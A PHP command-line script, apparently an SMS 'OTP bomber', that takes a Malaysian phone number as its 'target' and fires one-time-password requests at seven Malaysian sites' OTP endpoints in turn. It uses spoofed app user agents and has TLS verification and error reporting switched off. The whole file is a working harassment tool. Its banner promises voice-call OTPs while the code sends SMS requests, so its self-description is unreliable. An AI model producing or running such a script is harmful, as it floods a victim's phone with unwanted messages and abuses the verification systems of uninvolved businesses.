<?php

// TOTALLY NEW SCRIPT - NO curl_close() DEPRECATION
error_reporting(0); // Hide notices
ob_start();

echo "\n╔══════════════════════════════════════╗\n";
echo "║     MALAYSIA VOICE CALL OTP         ║\n";
echo "║        ALTERNATIVE METHOD           ║\n";
echo "╚══════════════════════════════════════╝\n\n";

// Get phone number
echo "Enter Malaysian number: ";
$input = trim(fgets(STDIN));
$original = preg_replace('/[^0-9]/', '', $input);

// Format for different services
$number_60 = "60" . ltrim($original, '0'); // 601128094968
$number_0 = "0" . ltrim($original, '0');   // 01128094968
$number_plus = "+60" . ltrim($original, '0'); // +601128094968

echo "[+] Target formats:\n";
echo "    • $number_60 (International)\n";
echo "    • $number_0 (Local)\n";
echo "    • $number_plus (With plus)\n\n";

// ===========================================
// SERVICE 1: CAROUSELL (SMS - but works for 011)
// ===========================================
echo "[*] Sending via Carousell... ";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.carousell.com.my/api/v1/otp/send/");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=" . urlencode($number_60) . "&country_code=60");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "User-Agent: Carousell/4.8.0 (Android 13; SM-S918B)",
    "Content-Type: application/x-www-form-urlencoded"
]);
$response = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);
unset($ch);

if ($info['http_code'] == 200) {
    echo "✅ SENT\n";
} else {
    echo "❌ FAILED\n";
}

sleep(1);

// ===========================================
// SERVICE 2: MUDAH (SMS - works for 011)
// ===========================================
echo "[*] Sending via Mudah.my... ";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.mudah.my/api/otp/request");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "mobile=" . urlencode($number_60) . "&country_code=60");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "User-Agent: Mudah/4.2.0 (Android 13; Pixel 7)",
    "Content-Type: application/x-www-form-urlencoded"
]);
$response = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);
unset($ch);

if ($info['http_code'] == 200) {
    echo "✅ SENT\n";
} else {
    echo "❌ FAILED\n";
}

sleep(1);

// ===========================================
// SERVICE 3: PROPERTYGURU (SMS - works for 011)
// ===========================================
echo "[*] Sending via PropertyGuru... ";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.propertyguru.com.my/api/v1/otp/send");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=" . urlencode($number_60) . "&country_code=60");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "User-Agent: PropertyGuru/3.9.0 (Android 13; Xiaomi 13)",
    "Content-Type: application/x-www-form-urlencoded"
]);
$response = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);
unset($ch);

if ($info['http_code'] == 200) {
    echo "✅ SENT\n";
} else {
    echo "❌ FAILED\n";
}

sleep(1);

// ===========================================
// SERVICE 4: IPROPERTY (SMS - works for 011)
// ===========================================
echo "[*] Sending via iProperty... ";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.iproperty.com.my/api/v1/otp/send");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "mobile_no=" . urlencode($number_60) . "&country_code=60");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "User-Agent: iProperty/3.0.0 (Android 13; OnePlus 11)",
    "Content-Type: application/x-www-form-urlencoded"
]);
$response = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);
unset($ch);

if ($info['http_code'] == 200) {
    echo "✅ SENT\n";
} else {
    echo "❌ FAILED\n";
}

sleep(1);

// ===========================================
// SERVICE 5: JOBSTREET (SMS - works for 011)
// ===========================================
echo "[*] Sending via JobStreet... ";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.jobstreet.com.my/api/otp/send");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=" . urlencode($number_60) . "&country=MY");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "User-Agent: JobStreet/5.0.0 (Android 13; Samsung S23)",
    "Content-Type: application/x-www-form-urlencoded"
]);
$response = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);
unset($ch);

if ($info['http_code'] == 200) {
    echo "✅ SENT\n";
} else {
    echo "❌ FAILED\n";
}

sleep(1);

// ===========================================
// SERVICE 6: BEAUTYMN (SMS - works for 011)
// ===========================================
echo "[*] Sending via BeautyMN... ";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.beautymn.com/v1/otp/send");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=" . urlencode($number_60) . "&country_code=60");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "User-Agent: BeautyMN/2.1.0 (Android 13; OPPO Find X6)",
    "Content-Type: application/x-www-form-urlencoded"
]);
$response = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);
unset($ch);

if ($info['http_code'] == 200) {
    echo "✅ SENT\n";
} else {
    echo "❌ FAILED\n";
}

sleep(1);

// ===========================================
// SERVICE 7: SPEEDHOME (SMS - works for 011)
// ===========================================
echo "[*] Sending via Speedhome... ";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.speedhome.com/api/v1/otp/request");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=" . urlencode($number_60) . "&country_code=60");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "User-Agent: Speedhome/3.1.0 (Android 13; Huawei P60)",
    "Content-Type: application/x-www-form-urlencoded"
]);
$response = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);
unset($ch);

if ($info['http_code'] == 200) {
    echo "✅ SENT\n";
} else {
    echo "❌ FAILED\n";
}

echo "\n══════════════════════════════════════\n";
echo "COMPLETED\n";
echo "══════════════════════════════════════\n";
echo "✓ These are SMS OTP services\n";
echo "✓ 011 numbers are supported\n";
echo "✓ Check your SMS inbox\n";
echo "✓ You should receive OTP codes via SMS\n";
echo "══════════════════════════════════════\n\n";

ob_end_flush();
?>
